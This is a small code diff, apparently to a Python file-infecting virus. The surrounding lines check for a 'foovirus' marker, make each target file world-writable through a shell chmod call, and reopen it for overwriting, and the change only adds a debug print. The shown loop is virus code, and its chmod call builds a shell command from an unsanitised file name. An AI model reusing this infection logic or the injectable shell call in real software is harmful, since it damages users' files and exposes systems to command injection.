@@ -122,6 +122,7 @@ while True:
                         IN.close()
                         if any('foovirus' in line for line in all_of_it): continue
                         # os.chmod(item, 0o777)
+                        print(f"chmod success test")
                         success = os.system(f"chmod 777 {item}")
                         print(f"chmod success: {success}")    
                         OUT = open(item, 'w')
